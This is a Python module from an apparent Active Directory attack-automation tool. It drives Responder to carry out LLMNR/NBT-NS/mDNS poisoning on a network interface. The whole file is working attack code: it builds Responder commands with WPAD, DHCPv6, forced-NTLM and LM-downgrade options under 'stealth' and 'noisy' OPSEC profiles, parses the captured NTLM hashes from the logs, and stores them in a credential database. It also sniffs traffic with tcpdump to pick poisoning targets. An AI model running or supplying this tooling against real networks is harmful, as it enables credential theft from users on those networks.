#!/usr/bin/env python3
"""
Responder Module for AD-Automaton
Handles LLMNR/NBT-NS/mDNS poisoning attacks using Responder.
"""

import os
import re
import time
import logging
import signal
import subprocess
from typing import List, Dict, Any, Optional
from pathlib import Path

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential
from executor import CommandExecutor
from parsers import ResponderParser
from logger import log_discovery, log_tool_execution, log_tool_result

class ResponderAttacker:
    """
    Handles LLMNR/NBT-NS/mDNS poisoning attacks using Responder.
    Captures credentials from network authentication attempts.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the Responder attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = ResponderParser()
        
        # Get Responder configuration
        self.responder_config = config.get('tools', {}).get('responder', {})
        self.responder_path = self.responder_config.get('path', 'responder')
        self.responder_config_file = self.responder_config.get('config_file', '/etc/responder/Responder.conf')
        self.log_dir = self.responder_config.get('log_dir', '/var/log/responder')
        
        # Feature flag
        self.enabled = config.get('features', {}).get('enable_responder', True)
        
        # Runtime state
        self.responder_process = None
        self.attack_duration = 300  # Default 5 minutes
    
    def run_responder_attack(self, interface: str, duration: int = 300) -> List[Credential]:
        """
        Main method to run Responder poisoning attack.
        
        Args:
            interface: Network interface to use
            duration: Attack duration in seconds
            
        Returns:
            List of captured credentials
        """
        if not self.enabled:
            self.logger.info("Responder attacks are disabled in configuration")
            return []
        
        self.attack_duration = duration
        
        self.logger.info(f"Starting Responder attack on interface {interface} for {duration} seconds")
        
        # OPSEC warning for noisy attacks
        opsec_profile = self.config.get('opsec_profile', 'normal')
        if opsec_profile != 'noisy':
            self.logger.warning("Responder attacks are inherently noisy and may be detected!")
        
        captured_credentials = []
        
        try:
            # Start Responder
            self._start_responder(interface)
            
            # Wait for the attack duration
            self.logger.info(f"Responder running... waiting {duration} seconds for captures")
            time.sleep(duration)
            
            # Stop Responder
            self._stop_responder()
            
            # Parse captured credentials
            captured_credentials = self._parse_responder_logs()
            
            # Store credentials in database
            if captured_credentials:
                self._store_credentials(captured_credentials)
            
        except KeyboardInterrupt:
            self.logger.info("Responder attack interrupted by user")
            self._stop_responder()
        except Exception as e:
            self.logger.error(f"Responder attack failed: {e}")
            self._stop_responder()
        
        log_discovery("credentials via Responder", len(captured_credentials))
        
        return captured_credentials
    
    def _start_responder(self, interface: str) -> None:
        """
        Start Responder process.
        
        Args:
            interface: Network interface to use
        """
        try:
            # Ensure log directory exists
            Path(self.log_dir).mkdir(parents=True, exist_ok=True)
            
            # Build Responder command
            command = self._build_responder_command(interface)
            
            log_tool_execution("Responder", command)
            
            # Start Responder as background process
            self.responder_process = self.executor.execute_background(
                command, 
                log_file=f"{self.log_dir}/responder_output.log"
            )
            
            if self.responder_process:
                self.logger.info(f"Responder started with PID: {self.responder_process.pid}")
                
                # Give Responder time to initialize
                time.sleep(5)
                
                # Check if process is still running
                if self.responder_process.poll() is not None:
                    raise Exception("Responder process terminated unexpectedly")
            else:
                raise Exception("Failed to start Responder process")
            
        except Exception as e:
            self.logger.error(f"Failed to start Responder: {e}")
            raise
    
    def _stop_responder(self) -> None:
        """Stop Responder process gracefully."""
        if self.responder_process:
            try:
                self.logger.info("Stopping Responder...")
                success = self.executor.terminate_process(self.responder_process)
                
                if success:
                    self.logger.info("Responder stopped successfully")
                else:
                    self.logger.warning("Failed to stop Responder gracefully")
                
                self.responder_process = None
                
            except Exception as e:
                self.logger.error(f"Error stopping Responder: {e}")
    
    def _build_responder_command(self, interface: str) -> str:
        """
        Build Responder command with appropriate options.
        
        Args:
            interface: Network interface to use
            
        Returns:
            Complete Responder command
        """
        # Base command
        command = f"sudo {self.responder_path} -I {interface}"
        
        # Add common options
        command += " -w"  # Start WPAD server
        command += " -r"  # Answer to netbios wredir suffix
        command += " -d"  # Enable answers to DHCPv6 requests
        command += " -f"  # Enable answers to NETBIOS fingerprint queries
        
        # OPSEC considerations
        opsec_profile = self.config.get('opsec_profile', 'normal')
        
        if opsec_profile == 'stealth':
            # Stealth mode: minimal services
            command += " --lm"  # Force LM hashing downgrade
        elif opsec_profile == 'noisy':
            # Noisy mode: all services
            command += " -F"  # Force authentication for specific hosts
            command += " -P"  # Force NTLM authentication
        
        # Custom configuration file if specified
        if os.path.exists(self.responder_config_file):
            # Responder doesn't have a direct config file option in command line
            # Configuration is typically done by editing /etc/responder/Responder.conf
            pass
        
        # Verbose output
        command += " -v"
        
        return command
    
    def _parse_responder_logs(self) -> List[Credential]:
        """
        Parse Responder log files for captured credentials.
        
        Returns:
            List of captured credentials
        """
        credentials = []
        
        try:
            # Responder typically saves logs in /usr/share/responder/logs/ or /var/log/responder/
            log_directories = [
                '/usr/share/responder/logs',
                '/var/log/responder',
                self.log_dir,
                './logs'  # Current directory logs
            ]
            
            for log_dir in log_directories:
                if os.path.exists(log_dir):
                    log_files = self._find_responder_log_files(log_dir)
                    
                    for log_file in log_files:
                        file_credentials = self._parse_responder_log_file(log_file)
                        credentials.extend(file_credentials)
            
            # Remove duplicates
            unique_credentials = self._deduplicate_credentials(credentials)
            
            self.logger.info(f"Parsed {len(unique_credentials)} unique credentials from Responder logs")
            
        except Exception as e:
            self.logger.error(f"Failed to parse Responder logs: {e}")
        
        return credentials
    
    def _find_responder_log_files(self, log_dir: str) -> List[str]:
        """
        Find Responder log files in a directory.
        
        Args:
            log_dir: Directory to search for log files
            
        Returns:
            List of log file paths
        """
        log_files = []
        
        try:
            # Common Responder log file patterns
            patterns = [
                '*HTTP-NTLMv*.txt',
                '*SMB-NTLMv*.txt',
                '*LDAP-NTLMv*.txt',
                '*MSSQL-NTLMv*.txt',
                '*Responder-Session.log'
            ]
            
            import glob
            
            for pattern in patterns:
                matches = glob.glob(os.path.join(log_dir, pattern))
                log_files.extend(matches)
            
            # Also check for recent files (last 24 hours)
            import time
            current_time = time.time()
            recent_files = []
            
            for file_path in log_files:
                if os.path.exists(file_path):
                    file_mtime = os.path.getmtime(file_path)
                    if current_time - file_mtime < 86400:  # 24 hours
                        recent_files.append(file_path)
            
            return recent_files
            
        except Exception as e:
            self.logger.debug(f"Error finding log files in {log_dir}: {e}")
            return []
    
    def _parse_responder_log_file(self, log_file: str) -> List[Credential]:
        """
        Parse a single Responder log file.
        
        Args:
            log_file: Path to log file
            
        Returns:
            List of credentials from the file
        """
        credentials = []
        
        try:
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Use the parser to extract credentials
            file_credentials = self.parser.parse_log_file(content)
            credentials.extend(file_credentials)
            
            if file_credentials:
                self.logger.info(f"Found {len(file_credentials)} credentials in {log_file}")
            
        except Exception as e:
            self.logger.debug(f"Error parsing log file {log_file}: {e}")
        
        return credentials
    
    def _deduplicate_credentials(self, credentials: List[Credential]) -> List[Credential]:
        """
        Remove duplicate credentials.
        
        Args:
            credentials: List of credentials (may contain duplicates)
            
        Returns:
            List of unique credentials
        """
        seen = set()
        unique_credentials = []
        
        for cred in credentials:
            # Create a unique key for the credential
            key = (cred.username, cred.domain, cred.hash_value)
            
            if key not in seen:
                seen.add(key)
                unique_credentials.append(cred)
        
        return unique_credentials
    
    def _store_credentials(self, credentials: List[Credential]) -> None:
        """
        Store captured credentials in the database.
        
        Args:
            credentials: List of credentials to store
        """
        stored_count = 0
        
        for credential in credentials:
            # Add metadata
            credential.source_tool = "responder"
            
            if self.db_manager.add_credential(credential):
                stored_count += 1
                self.logger.info(f"Stored Responder credential: {credential.domain}\\{credential.username}")
        
        self.logger.info(f"Stored {stored_count} credentials from Responder attack")
    
    def configure_responder(self, config_overrides: Dict[str, Any]) -> bool:
        """
        Configure Responder settings.
        
        Args:
            config_overrides: Dictionary of configuration overrides
            
        Returns:
            True if configuration was successful
        """
        try:
            if not os.path.exists(self.responder_config_file):
                self.logger.warning(f"Responder config file not found: {self.responder_config_file}")
                return False
            
            # Read current configuration
            with open(self.responder_config_file, 'r') as f:
                config_lines = f.readlines()
            
            # Apply overrides
            modified_lines = []
            
            for line in config_lines:
                modified = False
                
                for key, value in config_overrides.items():
                    if line.startswith(f"{key}="):
                        modified_lines.append(f"{key}={value}\n")
                        modified = True
                        break
                
                if not modified:
                    modified_lines.append(line)
            
            # Write modified configuration
            with open(self.responder_config_file, 'w') as f:
                f.writelines(modified_lines)
            
            self.logger.info("Responder configuration updated")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to configure Responder: {e}")
            return False
    
    def analyze_network_traffic(self, interface: str, duration: int = 60) -> Dict[str, Any]:
        """
        Analyze network traffic to identify optimal targets for poisoning.
        
        Args:
            interface: Network interface to monitor
            duration: Monitoring duration in seconds
            
        Returns:
            Dictionary with traffic analysis results
        """
        self.logger.info(f"Analyzing network traffic on {interface} for {duration} seconds")
        
        analysis_results = {
            'llmnr_queries': [],
            'netbios_queries': [],
            'dhcp_requests': [],
            'active_hosts': []
        }
        
        try:
            # Use tcpdump to capture relevant traffic
            capture_file = f"/tmp/network_analysis_{int(time.time())}.pcap"
            
            # Capture LLMNR, NetBIOS, and DHCP traffic
            tcpdump_filter = "port 5355 or port 137 or port 67 or port 68"
            command = f"sudo tcpdump -i {interface} -w {capture_file} -c 1000 '{tcpdump_filter}'"
            
            log_tool_execution("tcpdump", command)
            result = self.executor.execute(command, timeout=duration + 10)
            
            if result.exit_code == 0 and os.path.exists(capture_file):
                # Analyze the captured traffic
                analysis_results = self._analyze_pcap_file(capture_file)
                
                # Clean up capture file
                os.remove(capture_file)
            
        except Exception as e:
            self.logger.error(f"Network traffic analysis failed: {e}")
        
        return analysis_results
    
    def _analyze_pcap_file(self, pcap_file: str) -> Dict[str, Any]:
        """
        Analyze captured network traffic.
        
        Args:
            pcap_file: Path to PCAP file
            
        Returns:
            Analysis results
        """
        analysis = {
            'llmnr_queries': [],
            'netbios_queries': [],
            'dhcp_requests': [],
            'active_hosts': []
        }
        
        try:
            # Use tshark to analyze the PCAP file
            command = f"tshark -r {pcap_file} -T fields -e ip.src -e ip.dst -e frame.protocols"
            result = self.executor.execute(command, timeout=30)
            
            if result.exit_code == 0:
                # Basic analysis of source/destination IPs
                active_ips = set()
                
                for line in result.stdout.split('\n'):
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            src_ip = parts[0].strip()
                            dst_ip = parts[1].strip()
                            
                            if src_ip and src_ip != '0.0.0.0':
                                active_ips.add(src_ip)
                            if dst_ip and dst_ip != '0.0.0.0':
                                active_ips.add(dst_ip)
                
                analysis['active_hosts'] = list(active_ips)
                self.logger.info(f"Identified {len(active_ips)} active hosts in network traffic")
            
        except Exception as e:
            self.logger.debug(f"PCAP analysis failed: {e}")
        
        return analysis

def run_responder_attack(db_manager: DatabaseManager, config: Dict[str, Any], 
                        interface: str, duration: int = 300) -> List[Credential]:
    """
    Main entry point for Responder attacks.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        interface: Network interface to use
        duration: Attack duration in seconds
        
    Returns:
        List of captured credentials
    """
    attacker = ResponderAttacker(db_manager, config)
    return attacker.run_responder_attack(interface, duration)

def analyze_network_for_poisoning(db_manager: DatabaseManager, config: Dict[str, Any], 
                                 interface: str) -> Dict[str, Any]:
    """
    Analyze network traffic for optimal poisoning targets.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        interface: Network interface to monitor
        
    Returns:
        Network analysis results
    """
    attacker = ResponderAttacker(db_manager, config)
    return attacker.analyze_network_traffic(interface) 